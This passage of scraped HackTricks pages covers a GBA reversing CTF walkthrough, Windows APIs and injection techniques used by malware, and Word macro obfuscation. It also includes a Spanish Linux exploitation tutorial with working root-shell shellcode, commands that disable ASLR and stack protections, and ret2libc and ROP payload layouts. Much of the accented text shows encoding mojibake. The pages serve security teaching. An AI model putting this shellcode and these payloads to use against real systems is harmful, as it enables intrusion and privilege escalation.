pressed\nDAT_030004d8\n=\nKEYINPUT\n|\n0xfc00\n;\npuVar6\n=\n&\nDAT_0200b03c\n;\nuVar4\n=\nDAT_030004d8\n;\ndo\n{\nuVar2\n=\nDAT_030004dc\n;\nuVar1\n=\n*\npuVar6\n;\nif\n((\nuVar1\n&\nDAT_030004da\n&\n~\nuVar4\n)\n!=\n0\n)\n{\nThe last if is checking\nuVar4\nis in the\nlast Keys\nand not is the current key, also called letting go off a button (current key is stored in\nuVar1\n).\nif\n(\nuVar1\n==\n4\n)\n{\nDAT_030000d4\n=\n0\n;\nuVar3\n=\nFUN_08001c24\n(\nDAT_030004dc\n);\nFUN_08001868\n(\nuVar2\n,\n0\n,\nuVar3\n);\nDAT_05000000\n=\n0x1483\n;\nFUN_08001844\n(\n&\nDAT_0200ba18\n);\nFUN_08001844\n(\n&\nDAT_0200ba20\n,\n&\nDAT_0200ba40\n);\nDAT_030000d8\n=\n0\n;\nuVar4\n=\nDAT_030004d8\n;\n}\nelse\n{\nif\n(\nuVar1\n==\n8\n)\n{\nif\n(\nDAT_030000d8\n==\n0xf3\n)\n{\nDISPCNT\n=\n0x404\n;\nFUN_08000dd0\n(\n&\nDAT_02008aac\n,\n0x6000000\n,\n&\nDAT_030000dc\n);\nFUN_08000354\n(\n&\nDAT_030000dc\n,\n0x3c\n);\nuVar4\n=\nDAT_030004d8\n;\n}\n}\nelse\n{\nif\n(\nDAT_030000d4\n<\n8\n)\n{\nDAT_030000d4\n=\nDAT_030000d4\n+\n1\n;\nFUN_08000864\n();\nif\n(\nuVar1\n==\n0x10\n)\n{\nDAT_030000d8\n=\nDAT_030000d8\n+\n0x3a\n;\nIn the previous code you can see that we are comparing\nuVar1\n(the place where the\nvalue of the pressed button\nis) with some values:\nFirst, it's compared with the\nvalue 4\n(\nSELECT\nbutton): In the challenge this button clears the screen\nThen, it's comparing it with the\nvalue 8\n(\nSTART\nbutton): In the challenge this checks is the code is valid to get the flag.\nIn this case the var\nDAT_030000d8\nis compared with 0xf3 and if the value is the same some code is executed.\nIn any other cases, some cont (\nDAT_030000d4\n) is checked. It's a cont because it's adding 1 right after entering in the code.\nI\nf less than 8 something that involves\nadding\nvalues to **\nDAT_030000d8\n** is done (basically it's adding the values of the keys pressed in this variable as long as the cont is less than 8).\nSo, in this challenge, knowing the values of the buttons, you needed to\npress a combination with a length smaller than 8 that the resulting addition is 0xf3.\nReference for this tutorial:\nhttps://exp.codes/Nostalgia/\n‚Äã\nGame Boy\nCourses\n‚Äã\nhttps://github.com/0xZ0F/Z0FCourse_ReverseEngineering\n‚Äã\n‚Äã\nhttps://github.com/malrev/ABD\n(Binary deobfuscation)\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFirmware Integrity\nNext\nAngr\nLast modified\n2mo ago"
    },
    {
        "title": "Common API used in Malware",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/common-api-used-in-malware",
        "text": "Common API used in Malware\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nGeneric\nNetworking\nRaw Sockets\nWinAPI Sockets\nsocket()\nWSAStratup()\nbind()\nbind()\nlisten()\nlisten()\naccept()\naccept()\nconnect()\nconnect()\nread()/recv()\nrecv()\nwrite()\nsend()\nshutdown()\nWSACleanup()\nPersistence\nRegistry\nFile\nService\nRegCreateKeyEx()\nGetTempPath()\nOpenSCManager\nRegOpenKeyEx()\nCopyFile()\nCreateService()\nRegSetValueEx()\nCreateFile()\nStartServiceCtrlDispatcher()\nRegDeleteKeyEx()\nWriteFile()\n‚Äã\nRegGetValue()\nReadFile()\n‚Äã\nEncryption\nName\nWinCrypt\nCryptAcquireContext()\nCryptGenKey()\nCryptDeriveKey()\nCryptDecrypt()\nCryptReleaseContext()\nAnti-Analysis/VM\nFunction Name\nAssembly Instructions\nIsDebuggerPresent()\nCPUID()\nGetSystemInfo()\nIN()\nGlobalMemoryStatusEx()\n‚Äã\nGetVersion()\n‚Äã\nCreateToolhelp32Snapshot [Check if a process is running]\n‚Äã\nCreateFileW/A [Check if a file exist]\n‚Äã\nStealth\nName\nText\nVirtualAlloc\nAlloc memory (packers)\nVirtualProtect\nChange memory permission (packer giving execution permission to a section)\nReadProcessMemory\nInjection into external processes\nWriteProcessMemoryA/W\nInjection into external processes\nNtWriteVirtualMemory\n‚Äã\nCreateRemoteThread\nDLL/Process injection...\nNtUnmapViewOfSection\n‚Äã\nQueueUserAPC\n‚Äã\nCreateProcessInternalA/W\n‚Äã\nExecution\nFunction Name\nCreateProcessA/W\nShellExecute\nWinExec\nResumeThread\nNtResumeThread\nMiscellaneous\nGetAsyncKeyState() -- Key logging\nSetWindowsHookEx -- Key logging\nGetForeGroundWindow -- Get running window name (or the website from a browser)\nLoadLibrary() -- Import library\nGetProcAddress() -- Import library\nCreateToolhelp32Snapshot() -- List running processes\nGetDC() -- Screenshot\nBitBlt() -- Screenshot\nInternetOpen(), InternetOpenUrl(), InternetReadFile(), InternetWriteFile() -- Access the Internet\nFindResource(), LoadResource(), LockResource() -- Access resources of the executable\nMalware Techniques\nDLL Injection\nExecute an arbitrary DLL inside another process\n1.\nLocate the process to inject the malicious DLL: CreateToolhelp32Snapshot, Process32First, Process32Next\n2.\nOpen the process: GetModuleHandle, GetProcAddress, OpenProcess\n3.\nWrite the path to the DLL inside the process: VirtualAllocEx, WriteProcessMemory\n4.\nCreate a thread in the process that will load the malicious DLL: CreateRemoteThread, LoadLibrary\nOther functions to use: NTCreateThreadEx, RtlCreateUserThread\nReflective DLL Injection\nLoad a malicious DLL without calling normal Windows API calls.\nThe DLL is mapped inside a process, it will resolve the import addresses, fix the relocations and call the DllMain function.\nThread Hijacking\nFind a thread from a process and make it load a malicious DLL\n1.\nFind a target thread: CreateToolhelp32Snapshot, Thread32First, Thread32Next\n2.\nOpen the thread: OpenThread\n3.\nSuspend the thread: SuspendThread\n4.\nWrite the path to the malicious DLL inside the victim process: VirtualAllocEx, WriteProcessMemory\n5.\nResume the thread loading the library: ResumeThread\nPE Injection\nPortable Execution Injection: The executable will be written in the memory of the victim process and it will be executed from there.\nProcess Hollowing\nThe malware will unmap the legitimate code from memory of the process and load a malicious binary\n1.\nCreate a new process: CreateProcess\n2.\nUnmap the memory: ZwUnmapViewOfSection, NtUnmapViewOfSection\n3.\nWrite the malicious binary in the process memory: VirtualAllocEc, WriteProcessMemory\n4.\nSet the entrypoint and execute: SetThreadContext, ResumeThread\nHooking\nThe\nSSDT\n(\nSystem Service Descriptor Table\n) points to kernel functions (ntoskrnl.exe) or GUI driver (win32k.sys) so user processes can call these functions.\nA rootkit may modify these pointer to addresses that he controls\nIRP\n(\nI/O Request Packets\n) transmit pieces of data from one component to another. Almost everything in the kernel uses IRPs and each device object has its own function table that can be hooked: DKOM (Direct Kernel Object Manipulation)\nThe\nIAT\n(\nImport Address Table\n) is useful to resolve dependencies. It's possible to hook this table in order to hijack the code that will be called.\nEAT\n(\nExport Address Table\n) Hooks. This hooks can be done from\nuserland\n. The goal is to hook exported functions by DLLs.\nInline Hooks\n: This type are difficult to achieve. This involve modifying the code of the functions itself. Maybe by putting a jump at the beginning of this.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nBlobrunner\nNext\n- Reversing & Exploiting\nWord Macros\nLast modified\n2mo ago"
    },
    {
        "title": "Word Macros",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/word-macros",
        "text": "Word Macros\n‚Äã\n‚òÅ\u0000Ô∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nJunk Code\nIt's very common to find\njunk code that is never used\nto make the reversing of the macro more difficult.\nFor example, in the following image you can see that and If that is never going to be true is used to execute some junk and useless code.\nMacro Forms\nUsing the\nGetObject\nfunction it's possible to obtain data from forms of the macro. This can be used to difficult the analysis. The following is a photo of a macro form used to\nhide data inside text boxes\n(a text box can be hiding other text boxes):\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nReversing & Exploiting -\nPrevious\nCommon API used in Malware\nNext\n- Reversing & Exploiting\nLinux Exploiting (Basic) (SPA)\nLast modified\n6mo ago"
    },
    {
        "title": "Linux Exploiting (Basic) (SPA)",
        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp",
        "text": "Linux Exploiting (Basic) (SPA)\nLinux Exploiting (Basic) (SPA)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nASLR\nAleatorizaci√≥n de direcciones\nDesactiva aleatorizacion(ASLR) GLOBAL (root)\n:\necho 0 > /proc/sys/kernel/randomize_va_space\nReactivar aletorizacion GLOBAL: echo 2 > /proc/sys/kernel/randomize_va_space\nDesactivar para una ejecuci√≥n\n(no requiere root):\nsetarch `arch` -R ./ejemplo argumentos\nsetarch `uname -m` -R ./ejemplo argumentos\nDesactivar protecci√≥n de ejecuci√≥n en pila\ngcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo\nCore file\nulimit -c unlimited\ngdb /exec core_file\n/etc/security/limits.conf -> * soft core unlimited\nText\nData\nBSS\nHeap\nStack\nSecci√≥n BSS\n: Variables globales o est√°ticas sin inicializar\nstatic int i;\nSecci√≥n DATA\n: Variables globales o est√°ticas inicializadas\nint i = 5;\nSecci√≥n TEXT\n: Instrucciones del c√≥digo (opcodes)\nSecci√≥n HEAP\n: Buffer reservados de forma din√°nima (malloc(), calloc(), realloc() )\nSecci√≥n STACK\n: La pila (Argumentos pasados, cadenas de entorno (env), variables locales‚Ä¶)\n1.STACK OVERFLOWS\nbuffer overflow, buffer overrun, stack overrun, stack smashing\nFallo de segmentaci√≥n o violaci√≥n de segmento: Cuando se intenta acceder a una direcci√≥n de memoria que no ha sido asignada al proceso.\nPara obtener la direcci√≥n de una funci√≥n dentro de un programa se puede hacer:\nobjdump -d ./PROGRAMA | grep FUNCION\nROP\nCall to sys_execve\nROP - call sys_execve\n2.SHELLCODE\nVer interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep ‚Äú__NR_‚Äù\nsetreuid(0,0); // __NR_setreuid 70\nexecve(‚Äú/bin/sh‚Äù, args[], NULL); // __NR_execve 11\nexit(0); // __NR_exit 1\nxor eax, eax ; limpiamos eax\nxor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\nmov al, 0x01 ; eax = 1 ‚Äî> __NR_exit 1\nint 0x80 ; Ejecutar syscall\nnasm -f elf assembly.asm\n‚Äî> Nos devuelve un .o\nld assembly.o -o shellcodeout\n‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con\nobjdump\nobjdump -d -Mintel ./shellcodeout\n‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes\nComprobar que la shellcode funciona\nchar shellcode[] = ‚Äú\\x31\\xc0\\x31\\xdb\\xb0\\x01\\xcd\\x80‚Äù\n‚Äã\nvoid main(){\nvoid (*fp) (void);\nfp = (void *)shellcode;\nfp();\n}<span id=\"mce_marker\" data-mce-type=\"bookmark\" data-mce-fragment=\"1\">‚Äã</span>\nPara ver que las llamadas al sistema se realizan correctamente se debe compilar el programa anterior y las llamadas del sistema deben aparecer en\nstrace ./PROGRAMA_COMPILADO\nA la hora de crear shellcodes se puede realizar un truco. La primera instrucci√≥n es un jump a un call. El call llama al c√≥digo original y adem√°s mete en el stack el EIP. Despu√©s de la instrucci√≥n call hemos metido el string que necesit√°semos, por lo que con ese EIP podemos se√±alar al string y adem√°s continuar ejecutando el c√≥digo.\nEJ\nTRUCO (/bin/sh)\n:\njmp                 0x1f                                        ; Salto al √∫ltimo call\npopl                %esi                                       ; Guardamos en ese la direcci√≥n al string\nmovl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)\nxorl                 %eax, %eax             ; eax = NULL\nmovb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh\nmovl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh\nmovl   $0xb, %eax               ; Syscall 11\nmovl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù\nleal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}\nleal                 0xc(%esi), %edx      ; arg3 = NULL\nint                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)\nxorl                 %ebx, %ebx             ; ebx = NULL\nmovl   %ebx, %eax\ninc                   %eax                          ; Syscall 1\nint                    $0x80                         ; exit(0)\ncall                  -0x24                          ; Salto a la primera instruci√≥n\n.string             \\‚Äù/bin/sh\\‚Äù                               ; String a usar<span id=\"mce_marker\" data-mce-type=\"bookmark\" data-mce-fragment=\"1\">‚Äã</span>\nEJ usando el Stack(/bin/sh):\nsection .text\nglobal _start\n_start:\nxor                  eax, eax                     ;Limpieza\nmov                al, 0x46                      ; Syscall 70\nxor                  ebx, ebx                     ; arg1 = 0\nxor                  ecx, ecx                     ; arg2 = 0\nint                    0x80                           ; setreuid(0,0)\nxor                  eax, eax                     ; eax = 0\npush   eax                             ; ‚Äú\\0‚Äù\npush               dword 0x68732f2f ; ‚Äú//sh‚Äù\npush               dword 0x6e69622f; ‚Äú/bin‚Äù\nmov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\\0‚Äù\npush               eax                             ; Null -> args[1]\npush               ebx                             ; ‚Äú/bin/sh\\0‚Äù -> args[0]\nmov                ecx, esp                     ; arg2 = args[]\nmov                al, 0x0b                      ; Syscall 11\nint                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)\nEJ FNSTENV:\nfabs\nfnstenv [esp-0x0c]\npop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs\n‚Ä¶\nEgg Huter:\nConsiste en un peque√±o c√≥digo que recorre las p√°ginas de memoria asociadas a un proceso en busca de la shellcode ahi guardada (busca alguna firma puesta en la shellcode). √ötil en los casos en los que solo se tiene un peque√±o espacio para inyectar c√≥digo.\nShellcodes polim√≥rficos\nConsisten el shells cifradas que tienen un peque√±o c√≥digos que las descifran y saltan a √©l, usando el truco de Call-Pop este ser√≠a un\nejemplo cifrado cesar\n:\nglobal _start\n_start:\njmp short magic\ninit:\npop     esi\nxor      ecx, ecx\nmov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)\ndesc:\nsub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)\nsub     cl, 1\njnz       desc\njmp     short sc\nmagic:\ncall init\nsc:\n;Aqu√≠ va el shellcode\n1.\nAtacando el Frame Pointer (EBP)\n√ötil en una situaci√≥n en la que podemos modificar el EBP pero no el EIP.\nSe sabe que al salir de una funci√≥n se ejecuta el siguente c√≥digo ensamblador:\nmovl               %ebp, %esp\npopl                %ebp\nret\nDe esta forma, si se puede modificar el EBP al salir de una funci√≥n (fvuln) que ha sido llamada por otra funci√≥n, cuando la funci√≥n que llam√≥ a fvuln finalice, su EIP puede ser modificado.\nEn fvuln se puede introducir un EBP falso que apunte a un sitio donde est√© la direcci√≥nd e la shellcode + 4 (hay que sumarle 4 por el pop). As√≠, al salir de la funci√≥n, se meter√° en ESP el valor de &(&Shellcode)+4, con el pop se le restar√° 4 al ESP y este apuntar√° a la direcci√≥n de la shellcode cuando se ejcute el ret.\nExploit:\n&Shellcode + \"AAAA\" + SHELLCODE + relleno + &(&Shellcode)+4\nOff-by-One Exploit\nSe permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcci√≥n de la shellcode debe compartir los 3 primeros bytes con el EBP.\n4. M√©todos return to Libc\nM√©todo √∫til cuando el stack no es ejecutable o deja un buffer muy peque√±o para modificar.\nEl ASLR provoca que en cada ejecuci√≥n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este m√©todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa est√° siendo ejecutado constantemente en la misma direcci√≥n s√≠ puede ser √∫til.\ncdecl(C declaration)\nMete los argumentos en el stack y tras salir de la funci√≥n limpia la pila\nstdcall(standard call)\nMete los argumentos en la pila y es la funci√≥n llamada la que la limpia\nfastcall\nMete los dos primeros argumentos en registros y el resto en la pila\nSe pone la direcci√≥n de la instrucci√≥n system de libc y se le pasa como argumento el string ‚Äú/bin/sh‚Äù, normalmente desde una variable de entorno. Adem√°s, se usa la direcci√≥n a la funci√≥n exit para que una vez que no se requiera m√°s la shell, salga el programa sin dar problemas (y escribir logs).\nexport SHELL=/bin/sh\nPara encontrar las direcciones que necesitaremos se puede mirar dentro de\nGDB:\np system\np exit\nrabin2 -i ejecutable\n‚Äî> Da la direcci√≥n de todas las funciones que usa el programa al cargarse\n(Dentro de un start o algun breakpoint):\nx/500s $esp\n‚Äî> Buscamos dentro de aqui el string /bin/sh\nUna vez tengamos estas direcciones el\nexploit\nquedar√≠a:\n‚ÄúA‚Äù * DISTANCIA EBP + 4 (EBP: pueden ser 4 \"A\"s aunque mejor si es el EBP real para evitar fallos de segmentaci√≥n) + Direcci√≥n de\nsystem\n(sobreescribir√° el EIP) + Direcci√≥n de\nexit\n(al salir de system(‚Äú/bin/sh‚Äù) se llamar√° a esta funci√≥n pues los primero 4bytes del stack son tratados como la siguiente direcci√≥n del EIP a ejecutar) + Direcci√≥n de ‚Äú\n/bin/sh\n‚Äù (ser√° el par√°metro pasado a system)\nDe esta forma el EIP se sobreescribir√° con la direcci√≥n de system la cual recibir√° como par√°metro el string ‚Äú/bin/sh‚Äù y al salir de este ejecutar√° la funci√≥n exit().\nEs posible encontrarse en la situaci√≥n de que alg√∫n byte de alguna direcci√≥n de alguna funci√≥n sea nulo o espacio (\\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funci√≥n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funci√≥n directamente (por ejemplo con > x/8i system-4).\nEste m√©todo funciona pues al llamar a una funci√≥n como system usando el opcode\nret\nen vez de\ncall\n, la funci√≥n entiende que los primeros 4bytes ser√°n la direcci√≥n\nEIP\na la que volver.\nUna t√©cnica interesante con este m√©todo es el llamar a\nstrncpy()\npara mover un payload del stack al heap y posteriormente usar\ngets()\npara ejecutar dicho payload.\nOtra t√©cnica interesante es el uso de\nmprotect()\nla cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o serv√≠a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuci√≥n). Con este ataque se podr√≠a volver a configurar la pila como ejecutable.\nEncadenamiento de funciones\nBas√°ndonos en la t√©cnica anterior, esta forma de exploit consiste en:\nRelleno + &Funci√≥n1 + &pop;ret; + &arg_fun1 + &Funci√≥n2 + &pop;ret; + &arg_fun2 + ‚Ä¶\nDe esta forma se pueden encadenar funciones a las que llamar. Adem√°s, si se quieren usar funciones con varios argumentos, se pueden poder los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar direcci√≥n a un sitio con opcodes: pop, pop, pop, pop, ret ‚Äî>\nobjdump -d ejecutable\nEncadenamiento mediante falseo de frames (encadenamiento de EBPs)\nConsiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuci√≥n de varias funciones a trav√©s del EBP y de \"leave;ret\"\nRELLENO\nSituamos en el EBP un EBP falso que apunta a: 2¬∫ EBP_falso + la funci√≥n a ejecutar: (&system() + &leave;ret + &‚Äú/bin/sh‚Äù)\nEn el EIP ponemos de direcci√≥n una funci√≥n &(leave;ret)\nIniciamos la shellcode con la direcci√≥n a la siguiente parte de la shellcode, por ej: 2¬∫EBP_falso + &system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù\nel 2¬∫EBP ser√≠a: 3¬∫EBP_falso + &system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù\nEsta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguir√° una shellcode f√°cilmente divisible por peque√±os trozos de memoria.\n(Se encadena la ejecuci√≥n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)\n5.M√©todos complementarios\nRet2Ret\n√ötil para cuando no se puede meter una direcci√≥n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci√≥n de la shellcode. Pero, la funci√≥n vulnerable acepte un par√°metro (la shellcode ir√° aqu√≠).\nDe esta forma, al cambiar el EIP por una direcci√≥n a un\nret\n, se cargar√° la siguiente direcci√≥n (que es la direcci√≥n del primer argumento de la funci√≥n). Es decir, se cargar√° la shellcode.\nEl exploit quedar√≠a: SHELLCODE + Relleno (hasta EIP) +\n&ret\n(los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcci√≥n al par√°metro pasado)\nAl parecer funciones como\nstrncpy\nuna vez completas eliminan de la pila la direcci√≥n donde estaba guardada la shellcode imposibilitando esta t√©cnica. Es decir, la direcci√≥n que pasan a la funci√≥n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo\nret\nse encuentra con un 0x00 y el programa muere.\n**Ret2PopRet**\nSi no tenemos control sobre el primer argumento pero s√≠ sobre el segundo o el tercero, podemos sobreescribir EIP con una direcci√≥n a pop-ret o pop-pop-ret, seg√∫n la que necesitemos.\nT√©cnica de Murat\nEn linux todos los progamas se mapean comenzando en 0xbfffffff\nViendo como se construye la pila de un nuevo proceso en linux se puede desarrollar un exploit de forma que programa sea arrancado en un entorno cuya √∫nica variable sea la shellcode. La direcci√≥n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)\nDe esta forma se obtendr√≠a de forma sensilla la direcci√≥n donde est√° la variable de entorno con la shellcode.\nEsto se puede hacer gracias a que la funci√≥n execle permite crear un entorno que solo tenga las variables de entorno que se deseen\nJump to ESP: Windows Style\nDebido a que el ESP est√° apuntando al comienzo del stack siempre, esta t√©cnica consiste con sustituir el EIP con la direcci√≥n a una llamada a\njmp esp\no\ncall esp\n. De esta forma, se guarda la shellcode despu√©s de la sobreescritura del EIP ya que despu√©s de ejecutar el\nret\nel ESP se encontrar√° apuntando a la direcci√≥n siguiente, justo donde se ha guardado la shellcode.\nEn caso de que no se tenga el ASLR activo en Windows o Linux se puede llamar a\njmp esp\no\ncall esp\nalmacenadas en alg√∫n objeto compartido. En caso de que est√© el ASLR, se podr√≠a buscar dentro del propio programa vulnerable.\nAdem√°s, el hecho de poder colocar la shellcode despu√©s de la corrupci√≥n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funci√≥n no lleguen a tocar la shellcode (cosa que podr√≠a ocurrir en caso de ponerse en medio del stack de la funci√≥n).\nDe forma muy similar a esto si sabemos que una funci√≥n devuelve la direcci√≥n donde est√° guardada la shellcode se puede llamar a\ncall eax\no\njmp eax (ret2eax).\nROP (Return Oriented Programming) o borrowed code chunks\nLos trozos de c√≥digo que se invocan se conocen como gadgets.\nEsta t√©cnica consiste en encadenar distintas llamadas a funciones mediante la t√©cnica de\nret2libc\ny el uso de\npop,ret\n.\nEn algunas arquitecturas de procesadores cada instrucci√≥n es un conjunto de 32bits (MIPS por ej). Sin embargo, en Intel las instrucciones son de tama√±o variable y varias instrucciones pueden compartir un conjunto de bits, por ejemplo:\nmovl $0xe4ff, -0x(%ebp)\n‚Äî> Contiene los bytes 0xffe4 que tambi√©n se traducen por:\njmp *%esp\nDe esta forma se pueden ejecutar algunas instrucciones que realmente ni si quiera est√° en el programa original\nROPgadget.py\nnos ayuda a encontrar valores en binarios\nEste programa tambi√©n sirve para crear los\npayloads\n. Le puedes dar la librer√≠a de la que quieres sacar los ROPs y √©l generar√° un payload en python al cual tu le das la direcci√≥n en la que est√° dicha librer√≠a y el payload ya est√° listo para ser usado como shellcode. Adem√°s, como usa llamadas al sistema no ejecuta realmente nada en el stack sino que solo va guardando direcciones de ROPs que se ejecutar√°n mediante\nret\n. Para usar este payload hay que llamar al payload mediante una instrucci√≥n\nret\n.\nInteger overflows\nEste tipo de overflows se producen cuando una variable no est√° preparada para soportar un n√∫mero tan grande como se le pasa, posiblemente por una confusi√≥n entre variables con y sin signo, por ejemplo:\n#\ninclude\n<stdion.h>\n#\ninclude\n<string.h>\n#\ninclude\n<stdlib.h>\n‚Äã\nint\nmain\n(\nint\nargc\n,\nchar\n*\nargv\n[]){\nint\nlen\n;\nunsigned\nint\nl\n;\nchar\nbuffer\n[\n256\n];\nint\ni\n;\nlen\n=\nl\n=\nstrtoul\n(\nargv\n[\n1\n],\nNULL\n,\n10\n);\nprintf\n(\n\"\\nL = %u\\n\"\n,\nl\n);\nprintf\n(\n\"\\nLEN = 